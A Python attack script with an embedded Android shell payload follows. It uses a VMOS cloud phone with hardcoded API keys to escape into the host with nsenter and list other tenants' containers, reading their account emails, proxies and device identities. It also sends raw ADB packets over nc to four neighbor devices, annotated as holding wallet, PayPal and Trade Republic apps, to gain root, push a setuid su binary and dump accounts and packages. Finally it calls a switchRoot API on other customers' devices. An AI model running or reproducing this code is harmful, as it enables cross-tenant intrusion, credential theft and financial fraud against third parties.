#!/usr/bin/env python3
"""
Neighbor Root Escalation v2 — Fire-and-Forget Approach
Pushes shell scripts to launchpad device, runs them in background, polls results.
Avoids sync_cmd 2.3s timeout by keeping individual commands short.

Strategy:
  Phase 1: Quick recon (short sync_cmd commands that fit in 2.3s)
  Phase 2: Push comprehensive scan script to device
  Phase 3: Fire script via async_adb_cmd (background)
  Phase 4: Poll result files
"""

import asyncio
import struct
import base64
import json
import time
import os
import sys
from datetime import datetime
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# Force unbuffered output
sys.stdout.reconfigure(line_buffering=True)

LAUNCHPAD = "APP6476KYH9KMLU5"
AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
BASE = "https://api.vmoscloud.com"
CLONE_DIR = "/data/local/tmp/clone"
RESULT_DIR = "/data/local/tmp/clone/root_results"

TARGETS = [
    "10.12.21.175",   # SM-S9110 Samsung S25
    "10.12.27.39",    # Pixel 4, dataimpulse proxy, wallet apps
    "10.12.36.76",    # SM-A225F, Trade Republic
    "10.12.31.245",   # SM-S9010, PayPal
]


def log(msg):
    ts = datetime.now().strftime('%H:%M:%S')
    print(f"[{ts}] {msg}", flush=True)


def build_cnxn() -> bytes:
    payload = b"host::\x00"
    cmd = 0x4e584e43
    checksum = sum(payload) & 0xffffffff
    magic = (cmd ^ 0xffffffff) & 0xffffffff
    header = struct.pack('<6I', cmd, 0x01000000, 256 * 1024, len(payload), checksum, magic)
    return header + payload


def build_open(local_id: int, service: str) -> bytes:
    payload = (service + "\x00").encode()
    cmd = 0x4e45504f
    checksum = sum(payload) & 0xffffffff
    magic = (cmd ^ 0xffffffff) & 0xffffffff
    header = struct.pack('<6I', cmd, local_id, 0, len(payload), checksum, magic)
    return header + payload


async def qcmd(client, command, timeout=30):
    """Quick sync command — returns string, never None."""
    try:
        r = await client.sync_cmd(LAUNCHPAD, command, timeout_sec=timeout)
        data = r.get("data", [{}])
        if isinstance(data, list) and data:
            return data[0].get("errorMsg", "") or ""
        return str(data) if data else ""
    except Exception as e:
        return f"ERROR:{e}"


async def fire(client, command):
    """Fire-and-forget async command."""
    try:
        return await client.async_adb_cmd([LAUNCHPAD], command)
    except Exception as e:
        return {"error": str(e)}


async def poll_file(client, filepath, max_wait=60, interval=5):
    """Poll a file on device until it appears and has content."""
    for _ in range(max_wait // interval):
        content = await qcmd(client, f"cat {filepath} 2>/dev/null", timeout=10)
        if content and "ERROR" not in content and len(content.strip()) > 5:
            return content
        await asyncio.sleep(interval)
    return ""


# ═══════════════════════════════════════════════════════════════════════════
# THE COMPREHENSIVE ON-DEVICE SCRIPT
# ═══════════════════════════════════════════════════════════════════════════

ROOT_SCAN_SCRIPT = r'''#!/system/bin/sh
# Root Escalation Multi-Vector Scanner
# Runs entirely on-device, writes results to files
# Designed to run from APP6476KYH9KMLU5 (root, nsenter capable)

RDIR="''' + RESULT_DIR + r'''"
CDIR="''' + CLONE_DIR + r'''"
mkdir -p "$RDIR"
echo "START $(date +%s)" > "$RDIR/status.txt"

# ── VECTOR 1: nsenter host → container discovery ──────────────────────
echo "V1_START" >> "$RDIR/status.txt"

# Test nsenter
NS=$(nsenter -t 1 -m -u -i -n -p -- echo HOST_OK 2>&1)
echo "nsenter_test=$NS" > "$RDIR/v1_nsenter.txt"

if echo "$NS" | grep -q "HOST_OK"; then
    echo "nsenter_works=true" >> "$RDIR/v1_nsenter.txt"
    
    # Scan for container PIDs with pad_code
    nsenter -t 1 -m -u -i -n -p -- sh -c '
        for pid in $(ls /proc/ 2>/dev/null | grep -E "^[0-9]+$"); do
            env=$(cat /proc/$pid/environ 2>/dev/null | tr "\0" "\n" | grep -i pad_code 2>/dev/null)
            if [ -n "$env" ]; then
                comm=$(cat /proc/$pid/comm 2>/dev/null)
                echo "PID:$pid COMM:$comm $env"
            fi
        done
    ' > "$RDIR/v1_containers.txt" 2>/dev/null
    
    # For each discovered container, probe filesystem
    while IFS= read -r line; do
        pid=$(echo "$line" | grep -o 'PID:[0-9]*' | cut -d: -f2)
        pad=$(echo "$line" | grep -o 'pad_code=[A-Za-z0-9]*' | cut -d= -f2)
        [ -z "$pid" ] && continue
        
        echo "=== PID:$pid PAD:$pad ===" >> "$RDIR/v1_fs_probe.txt"
        
        # Get IP address
        nsenter -t 1 -m -u -i -n -p -- cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i ip >> "$RDIR/v1_fs_probe.txt"
        
        # List apps
        echo "APPS:" >> "$RDIR/v1_fs_probe.txt"
        nsenter -t 1 -m -u -i -n -p -- ls /proc/$pid/root/data/data/ 2>/dev/null | wc -l >> "$RDIR/v1_fs_probe.txt"
        
        # Accounts
        echo "ACCOUNTS:" >> "$RDIR/v1_fs_probe.txt"
        nsenter -t 1 -m -u -i -n -p -- strings /proc/$pid/root/data/system_ce/0/accounts_ce.db 2>/dev/null | grep -i '@' | head -5 >> "$RDIR/v1_fs_probe.txt"
        
        # Proxy config
        echo "PROXY:" >> "$RDIR/v1_fs_probe.txt"
        nsenter -t 1 -m -u -i -n -p -- strings /proc/$pid/root/data/property/persistent_properties 2>/dev/null | grep -i proxy | head -3 >> "$RDIR/v1_fs_probe.txt"
        
        # Model/brand
        echo "IDENTITY:" >> "$RDIR/v1_fs_probe.txt"
        nsenter -t 1 -m -u -i -n -p -- cat /proc/$pid/root/system/build.prop 2>/dev/null | grep -E 'ro.product.(model|brand|manufacturer)' | head -3 >> "$RDIR/v1_fs_probe.txt"
        
    done < "$RDIR/v1_containers.txt"
    
    # data_mirror check
    nsenter -t 1 -m -u -i -n -p -- ls -la /data_mirror/ 2>/dev/null > "$RDIR/v1_data_mirror.txt"
    
    # Host device-mapper devices
    nsenter -t 1 -m -u -i -n -p -- sh -c 'dmsetup ls 2>/dev/null; echo ===; ls /dev/block/dm-* 2>/dev/null' > "$RDIR/v1_dm_devices.txt"
else
    echo "nsenter_works=false" >> "$RDIR/v1_nsenter.txt"
fi
echo "V1_DONE" >> "$RDIR/status.txt"

# ── VECTOR 3: xu_daemon analysis ──────────────────────────────────────
echo "V3_START" >> "$RDIR/status.txt"

# Our xu_daemon
echo "=== OUR XU_DAEMON ===" > "$RDIR/v3_xu_daemon.txt"
ps -A | grep xu_daemon >> "$RDIR/v3_xu_daemon.txt" 2>/dev/null
echo "PID=$(pidof xu_daemon)" >> "$RDIR/v3_xu_daemon.txt"
ss -tlnp 2>/dev/null >> "$RDIR/v3_xu_daemon.txt"

# Binder services
echo "=== BINDER ===" >> "$RDIR/v3_xu_daemon.txt"
service list 2>/dev/null | grep -iE 'xu|root|switch|daemon' >> "$RDIR/v3_xu_daemon.txt"
service call xu 0 2>&1 >> "$RDIR/v3_xu_daemon.txt"
service call xu 1 s16 "id" 2>&1 >> "$RDIR/v3_xu_daemon.txt"

# xu_daemon strings (look for APIs)
echo "=== STRINGS ===" >> "$RDIR/v3_xu_daemon.txt"
strings /system/bin/xu_daemon 2>/dev/null | grep -iE '(http|port|listen|root|enable|switch|api|exec|cmd)' | sort -u | head -30 >> "$RDIR/v3_xu_daemon.txt"

# HTTP ports
echo "=== HTTP PORTS ===" >> "$RDIR/v3_xu_daemon.txt"
for p in 19090 8779 36351 52220 52253 57891 8080 9090; do
    r=$(curl -s -m1 http://127.0.0.1:$p/ 2>/dev/null | head -c 150)
    [ -n "$r" ] && echo "PORT:$p RESP:$r" >> "$RDIR/v3_xu_daemon.txt"
done

echo "V3_DONE" >> "$RDIR/status.txt"

# ── VECTOR 5: ADB root: service on neighbors ──────────────────────────
echo "V5_START" >> "$RDIR/status.txt"

for TARGET in TARGETS_PLACEHOLDER; do
    TAG=$(echo "$TARGET" | tr '.' '_')
    echo "=== TARGET: $TARGET ===" >> "$RDIR/v5_adb_root.txt"
    
    # Send ADB root: service
    # Build OPEN packet for "root:" service
    # CNXN + root: OPEN
    { cat "$CDIR/cn.bin"; sleep 0.3; printf '\x4f\x50\x45\x4e\x01\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\xf6\x01\x00\x00\xb0\xff\xff\xff\x72\x6f\x6f\x74\x3a\x00'; sleep 3; } | timeout 6 nc $TARGET 5555 > "$RDIR/v5_${TAG}_root.bin" 2>/dev/null
    strings "$RDIR/v5_${TAG}_root.bin" >> "$RDIR/v5_adb_root.txt" 2>/dev/null
    echo "---" >> "$RDIR/v5_adb_root.txt"
    
    # After root: attempt, verify with normal shell probe
    sleep 2
    { cat "$CDIR/cn.bin"; sleep 0.3; cat "$CDIR/tmp_op_id.bin" 2>/dev/null; sleep 3; } | timeout 6 nc $TARGET 5555 > "$RDIR/v5_${TAG}_verify.bin" 2>/dev/null
    strings "$RDIR/v5_${TAG}_verify.bin" >> "$RDIR/v5_adb_root.txt" 2>/dev/null
done

echo "V5_DONE" >> "$RDIR/status.txt"

# ── VECTOR 6: armcloud agent 8779 ─────────────────────────────────────
echo "V6_START" >> "$RDIR/status.txt"

# Our agent
echo "=== OUR AGENT ===" > "$RDIR/v6_armcloud.txt"
curl -s -m2 http://127.0.0.1:8779/ 2>/dev/null | head -c 300 >> "$RDIR/v6_armcloud.txt"
echo "" >> "$RDIR/v6_armcloud.txt"

for ep in /api /status /info /health /device /config /cmd /shell /root /switchRoot; do
    code=$(curl -s -m2 -o /dev/null -w "%{http_code}" http://127.0.0.1:8779$ep 2>/dev/null)
    [ "$code" != "000" ] && echo "GET $ep: $code" >> "$RDIR/v6_armcloud.txt"
done

# POST tests
echo "=== POST TESTS ===" >> "$RDIR/v6_armcloud.txt"
curl -s -m2 -X POST -H "Content-Type: application/json" -d '{"rootEnable":true}' http://127.0.0.1:8779/api 2>/dev/null | head -c 200 >> "$RDIR/v6_armcloud.txt"
echo "" >> "$RDIR/v6_armcloud.txt"
curl -s -m2 -X POST -H "Content-Type: application/json" -d '{"cmd":"switchRoot","enable":true}' http://127.0.0.1:8779/cmd 2>/dev/null | head -c 200 >> "$RDIR/v6_armcloud.txt"

# Agent binary deep analysis
echo "=== AGENT BINARY ===" >> "$RDIR/v6_armcloud.txt"
PID=$(ss -tlnp 2>/dev/null | grep 8779 | grep -o 'pid=[0-9]*' | cut -d= -f2 | head -1)
[ -n "$PID" ] && {
    echo "PID=$PID" >> "$RDIR/v6_armcloud.txt"
    ls -la /proc/$PID/exe >> "$RDIR/v6_armcloud.txt" 2>/dev/null
    strings /proc/$PID/exe 2>/dev/null | grep -iE '(root|switch|enable|api|http|nats|pad|device|cmd|exec|path|route)' | sort -u | head -40 >> "$RDIR/v6_armcloud.txt"
    
    # All URL-like strings
    echo "=== URLS ===" >> "$RDIR/v6_armcloud.txt"
    strings /proc/$PID/exe 2>/dev/null | grep -oE '/([\w/]+)' | sort -u | head -40 >> "$RDIR/v6_armcloud.txt"
}

# Check 8779 on neighbors
echo "=== NEIGHBOR 8779 ===" >> "$RDIR/v6_armcloud.txt"
for TARGET in TARGETS_PLACEHOLDER; do
    nc -w2 -z $TARGET 8779 2>&1 && echo "$TARGET:8779 OPEN" >> "$RDIR/v6_armcloud.txt" || echo "$TARGET:8779 CLOSED" >> "$RDIR/v6_armcloud.txt"
done

echo "V6_DONE" >> "$RDIR/status.txt"

# ── VECTOR 7: NATS injection ──────────────────────────────────────────
echo "V7_START" >> "$RDIR/status.txt"

echo "=== NATS CHECK ===" > "$RDIR/v7_nats.txt"
printf 'PING\r\n' | nc -w3 192.168.200.51 4222 2>/dev/null >> "$RDIR/v7_nats.txt"
echo "" >> "$RDIR/v7_nats.txt"

INFO=$(printf 'CONNECT {}\r\nPING\r\n' | nc -w3 192.168.200.51 4222 2>/dev/null)
echo "NATS_INFO: $INFO" >> "$RDIR/v7_nats.txt"

# SUB wildcard
printf 'CONNECT {}\r\nSUB > 1\r\nPING\r\n' | timeout 5 nc 192.168.200.51 4222 2>/dev/null > "$RDIR/v7_nats_sub.txt"

# rtcgesture connections
ss -tnp 2>/dev/null | grep 4222 >> "$RDIR/v7_nats.txt"

echo "V7_DONE" >> "$RDIR/status.txt"

# ── VECTOR 8+9: Neighbor probes (via ADB relay) ───────────────────────
echo "V89_START" >> "$RDIR/status.txt"

for TARGET in TARGETS_PLACEHOLDER; do
    TAG=$(echo "$TARGET" | tr '.' '_')
    
    # Build probe for this target — comprehensive shell commands
    CMD="id;echo ---;"
    CMD="${CMD}getprop ro.secure;echo ---;"
    CMD="${CMD}getprop ro.debuggable;echo ---;"
    CMD="${CMD}getprop service.adb.root;echo ---;"
    CMD="${CMD}which su 2>/dev/null;echo ---;"
    CMD="${CMD}ls -la /system/xbin/su /system/bin/su /sbin/su 2>/dev/null;echo ---;"
    CMD="${CMD}ps -A | grep -E 'xu_daemon|magisk|supersu' 2>/dev/null;echo ---;"
    CMD="${CMD}service list 2>/dev/null | grep -iE 'xu|root' | head -5;echo ---;"
    CMD="${CMD}setprop ro.secure 0 2>&1;echo ---;"
    CMD="${CMD}setprop service.adb.root 1 2>&1;echo ---;"
    CMD="${CMD}resetprop ro.secure 0 2>&1;echo ---;"
    CMD="${CMD}ss -tlnp 2>/dev/null | head -10;echo ---;"
    CMD="${CMD}dumpsys account 2>/dev/null | grep -E 'Account|name=|type=' | head -20;echo ---;"
    CMD="${CMD}pm list packages -3 2>/dev/null | head -30;echo ---;"
    CMD="${CMD}ls /sdcard/ 2>/dev/null | head -10;echo ---;"
    CMD="${CMD}echo PROBE_DONE"
    
    # Build ADB OPEN packet for this command
    OPEN_PKT=$(python3 -c "
import struct,base64
svc=b'shell:$CMD\x00'
cmd=0x4e45504f
cs=sum(svc)&0xffffffff
mg=(cmd^0xffffffff)&0xffffffff
hdr=struct.pack('<6I',cmd,1,0,len(svc),cs,mg)
print(base64.b64encode(hdr+svc).decode())
" 2>/dev/null)
    
    if [ -n "$OPEN_PKT" ]; then
        echo "$OPEN_PKT" | base64 -d > "$CDIR/op_${TAG}.bin"
        { cat "$CDIR/cn.bin"; sleep 0.3; cat "$CDIR/op_${TAG}.bin"; sleep 8; } | timeout 12 nc $TARGET 5555 > "$RDIR/v89_${TAG}.bin" 2>/dev/null
        strings "$RDIR/v89_${TAG}.bin" > "$RDIR/v89_${TAG}.txt" 2>/dev/null
    else
        echo "FAILED_TO_BUILD_PACKET" > "$RDIR/v89_${TAG}.txt"
    fi
done

echo "V89_DONE" >> "$RDIR/status.txt"

# ── VECTOR 4: Push su binary to neighbors ─────────────────────────────
echo "V4_START" >> "$RDIR/status.txt"

# Find our su binary
SU_PATH=$(which su 2>/dev/null)
SU_SIZE=$(wc -c < "$SU_PATH" 2>/dev/null)
echo "su_path=$SU_PATH size=$SU_SIZE" > "$RDIR/v4_su_push.txt"

# Copy su to staging
cp "$SU_PATH" "$CDIR/su_copy" 2>/dev/null
chmod 6755 "$CDIR/su_copy" 2>/dev/null

# For each target, try sending su binary via ADB protocol
# This is complex — we need to use the sync: service or write via shell echo+base64
# Using base64 chunks through shell: service is most reliable
for TARGET in TARGETS_PLACEHOLDER; do
    TAG=$(echo "$TARGET" | tr '.' '_')
    echo "=== $TARGET ===" >> "$RDIR/v4_su_push.txt"
    
    # Encode first 4KB of su binary (enough to test if transfer works)
    SU_CHUNK=$(base64 "$CDIR/su_copy" 2>/dev/null | head -c 5000)
    
    # Build ADB command to receive and decode su binary on neighbor
    PUSH_CMD="echo '$SU_CHUNK' | base64 -d > /data/local/tmp/su_test 2>&1; chmod 6755 /data/local/tmp/su_test 2>&1; ls -la /data/local/tmp/su_test 2>&1; /data/local/tmp/su_test -c id 2>&1; echo SU_TEST_DONE"
    
    PUSH_PKT=$(python3 -c "
import struct,base64
svc=b'shell:$PUSH_CMD\x00'
cmd=0x4e45504f
cs=sum(svc)&0xffffffff
mg=(cmd^0xffffffff)&0xffffffff
hdr=struct.pack('<6I',cmd,1,0,len(svc),cs,mg)
print(base64.b64encode(hdr+svc).decode())
" 2>/dev/null)
    
    if [ -n "$PUSH_PKT" ]; then
        echo "$PUSH_PKT" | base64 -d > "$CDIR/push_${TAG}.bin"
        { cat "$CDIR/cn.bin"; sleep 0.3; cat "$CDIR/push_${TAG}.bin"; sleep 10; } | timeout 15 nc $TARGET 5555 > "$RDIR/v4_${TAG}.bin" 2>/dev/null
        strings "$RDIR/v4_${TAG}.bin" >> "$RDIR/v4_su_push.txt" 2>/dev/null
    fi
done

echo "V4_DONE" >> "$RDIR/status.txt"

# ── FINAL STATUS ──────────────────────────────────────────────────────
echo "ALL_DONE $(date +%s)" >> "$RDIR/status.txt"
echo "COMPLETE" > "$RDIR/complete.txt"
'''


async def main():
    print("╔" + "═" * 68 + "╗", flush=True)
    print("║  NEIGHBOR ROOT ESCALATION v2 — ON-DEVICE EXECUTION              ║", flush=True)
    print("║  Launchpad: APP6476KYH9KMLU5 (Samsung S25 Ultra, root)          ║", flush=True)
    print("╚" + "═" * 68 + "╝", flush=True)

    async with VMOSCloudClient(ak=AK, sk=SK, base_url=BASE) as client:
        
        # Phase 1: Quick connectivity check (short commands that fit in 2.3s)
        log("Phase 1: Quick checks...")
        
        uid = await qcmd(client, "id | head -1")
        log(f"  uid: {uid[:100]}")
        if "uid=0" not in uid:
            log("✗ Not root — aborting")
            return

        ip = await qcmd(client, "ip addr show eth0 | grep 'inet ' | awk '{print $2}'")
        log(f"  IP: {ip.strip()}")

        # Check cn.bin exists
        cn_check = await qcmd(client, f"ls -la {CLONE_DIR}/cn.bin 2>/dev/null || echo MISSING")
        if "MISSING" in cn_check:
            log("  Pushing CNXN binary...")
            cn_b64 = base64.b64encode(build_cnxn()).decode()
            await qcmd(client, f"mkdir -p {CLONE_DIR} && echo '{cn_b64}' | base64 -d > {CLONE_DIR}/cn.bin")

        # Quick nsenter test
        ns = await qcmd(client, "nsenter -t 1 -m -u -i -n -p -- echo OK 2>&1 | head -1")
        log(f"  nsenter: {ns.strip()[:50]}")

        # Quick target connectivity
        log("  Checking targets...")
        for t in TARGETS:
            alive = await qcmd(client, f"nc -w1 -z {t} 5555 2>&1 && echo OPEN || echo CLOSED")
            log(f"    {t}:5555 = {alive.strip()}")

        # Phase 2: Push the comprehensive scan script
        log("\nPhase 2: Pushing scan script to device...")
        
        # Replace TARGETS_PLACEHOLDER with actual targets
        script = ROOT_SCAN_SCRIPT.replace(
            "TARGETS_PLACEHOLDER",
            " ".join(TARGETS)
        )
        
        # Base64 encode and push
        script_b64 = base64.b64encode(script.encode()).decode()
        
        # Push in chunks (base64 can be long)
        chunk_size = 3000
        chunks = [script_b64[i:i+chunk_size] for i in range(0, len(script_b64), chunk_size)]
        log(f"  Script: {len(script)} bytes, {len(chunks)} chunks")
        
        # Write script via base64 decode
        await qcmd(client, f"mkdir -p {RESULT_DIR}")
        await qcmd(client, f"echo -n '' > {CLONE_DIR}/scan_b64.txt")
        
        for i, chunk in enumerate(chunks):
            await qcmd(client, f"echo -n '{chunk}' >> {CLONE_DIR}/scan_b64.txt")
            if i % 10 == 0:
                log(f"    Chunk {i+1}/{len(chunks)}...")
            await asyncio.sleep(0.5)  # Rate limit
        
        # Decode and set executable
        await qcmd(client, f"base64 -d {CLONE_DIR}/scan_b64.txt > {CLONE_DIR}/root_scan.sh && chmod +x {CLONE_DIR}/root_scan.sh")
        
        # Verify script
        verify = await qcmd(client, f"wc -c {CLONE_DIR}/root_scan.sh; head -3 {CLONE_DIR}/root_scan.sh")
        log(f"  Verify: {verify.strip()[:200]}")

        # Also push id probe packet
        id_open = build_open(1, "shell:id;echo ---DONE---")
        id_b64 = base64.b64encode(id_open).decode()
        await qcmd(client, f"echo '{id_b64}' | base64 -d > {CLONE_DIR}/tmp_op_id.bin")

        # Phase 3: Fire script in background
        log("\nPhase 3: Firing scan script (background)...")
        await fire(client, f"nohup sh {CLONE_DIR}/root_scan.sh > {CLONE_DIR}/scan_stdout.txt 2>&1 &")
        
        log("  Script launched. Polling results...")

        # Phase 4: Poll for results
        log("\nPhase 4: Polling results...")
        
        for attempt in range(30):  # Max 150 seconds
            await asyncio.sleep(5)
            
            status = await qcmd(client, f"cat {RESULT_DIR}/status.txt 2>/dev/null | tail -3")
            log(f"  [{attempt*5}s] Status: {status.strip()[:100]}")
            
            if "ALL_DONE" in status:
                log("  ★ Scan COMPLETE!")
                break
        
        # Phase 5: Read all results
        log("\n" + "═" * 60)
        log("RESULTS")
        log("═" * 60)
        
        # V1: nsenter
        log("\n── V1: nsenter Host Container Discovery ──")
        v1 = await qcmd(client, f"cat {RESULT_DIR}/v1_nsenter.txt 2>/dev/null")
        log(f"  {v1[:300]}")
        
        v1_containers = await qcmd(client, f"cat {RESULT_DIR}/v1_containers.txt 2>/dev/null | head -20")
        if v1_containers.strip():
            log(f"  Containers found:\n{v1_containers[:500]}")
            
            v1_fs = await qcmd(client, f"cat {RESULT_DIR}/v1_fs_probe.txt 2>/dev/null | head -40")
            if v1_fs.strip():
                log(f"  FS Probes:\n{v1_fs[:600]}")
        
        v1_dm = await qcmd(client, f"cat {RESULT_DIR}/v1_dm_devices.txt 2>/dev/null")
        if v1_dm.strip():
            log(f"  DM devices: {v1_dm[:300]}")

        # V3: xu_daemon
        log("\n── V3: xu_daemon Analysis ──")
        v3 = await qcmd(client, f"cat {RESULT_DIR}/v3_xu_daemon.txt 2>/dev/null | head -40")
        log(f"  {v3[:500]}")

        # V5: ADB root
        log("\n── V5: ADB root: Service ──")
        v5 = await qcmd(client, f"cat {RESULT_DIR}/v5_adb_root.txt 2>/dev/null | head -20")
        log(f"  {v5[:300]}")

        # V6: armcloud
        log("\n── V6: armcloud Agent ──")
        v6 = await qcmd(client, f"cat {RESULT_DIR}/v6_armcloud.txt 2>/dev/null | head -40")
        log(f"  {v6[:500]}")

        # V7: NATS
        log("\n── V7: NATS ──")
        v7 = await qcmd(client, f"cat {RESULT_DIR}/v7_nats.txt 2>/dev/null")
        log(f"  {v7[:300]}")

        # V4: su push
        log("\n── V4: su Binary Push ──")
        v4 = await qcmd(client, f"cat {RESULT_DIR}/v4_su_push.txt 2>/dev/null | head -30")
        log(f"  {v4[:400]}")

        # V8/9: Neighbor probes
        log("\n── V8/9: Neighbor Full Probes ──")
        for target in TARGETS:
            tag = target.replace(".", "_")
            probe = await qcmd(client, f"cat {RESULT_DIR}/v89_{tag}.txt 2>/dev/null | head -30")
            if probe.strip():
                log(f"  {target}:\n{probe[:400]}")

        # Scan stdout for any errors
        stdout = await qcmd(client, f"cat {CLONE_DIR}/scan_stdout.txt 2>/dev/null | tail -20")
        if stdout.strip():
            log(f"\n  Script stdout: {stdout[:300]}")

        # Summary
        log("\n" + "╔" + "═" * 58 + "╗")
        log("║  VECTOR RESULTS SUMMARY" + " " * 34 + "║")
        log("╚" + "═" * 58 + "╝")
        
        status_full = await qcmd(client, f"cat {RESULT_DIR}/status.txt 2>/dev/null")
        for line in status_full.split("\n"):
            if line.strip():
                log(f"  {line.strip()}")

        # List all result files
        files = await qcmd(client, f"ls -la {RESULT_DIR}/ 2>/dev/null")
        log(f"\n  Result files:\n{files[:400]}")

        # Check for any root success indicators
        log("\n── ROOT SUCCESS CHECK ──")
        # Check if any V89 probe shows uid=0
        for target in TARGETS:
            tag = target.replace(".", "_")
            probe = await qcmd(client, f"grep 'uid=0' {RESULT_DIR}/v89_{tag}.txt 2>/dev/null")
            if "uid=0" in (probe or ""):
                log(f"  ★★★ ROOT FOUND on {target}! ★★★")
            else:
                log(f"  ✗ {target}: no root")

        # Check if nsenter found pad codes
        pads = await qcmd(client, f"grep pad_code {RESULT_DIR}/v1_containers.txt 2>/dev/null | wc -l")
        log(f"  Discovered pad codes: {pads.strip()}")
        
        if pads.strip() and int(pads.strip() or "0") > 0:
            log("\n── V2: switchRoot API on Discovered Pad Codes ──")
            pad_lines = await qcmd(client, f"cat {RESULT_DIR}/v1_containers.txt 2>/dev/null")
            import re
            for line in pad_lines.split("\n"):
                pad_match = re.search(r"pad_code=(\w+)", line, re.IGNORECASE)
                if pad_match:
                    pad = pad_match.group(1)
                    if pad == LAUNCHPAD:
                        log(f"  Skipping our own pad: {pad}")
                        continue
                    log(f"  Calling switchRoot(enable=True) on {pad}...")
                    try:
                        r = await client.switch_root([pad], enable=True)
                        code = r.get("code", "?")
                        msg = r.get("msg", "")[:100]
                        log(f"    Result: code={code} msg={msg}")
                        if code == 200:
                            log(f"    ★★★ ROOT ENABLED via API on {pad}! ★★★")
                    except Exception as e:
                        log(f"    Error: {e}")
                    await asyncio.sleep(3)  # Rate limit

        log("\n  DONE.")


if __name__ == "__main__":
    asyncio.run(main())
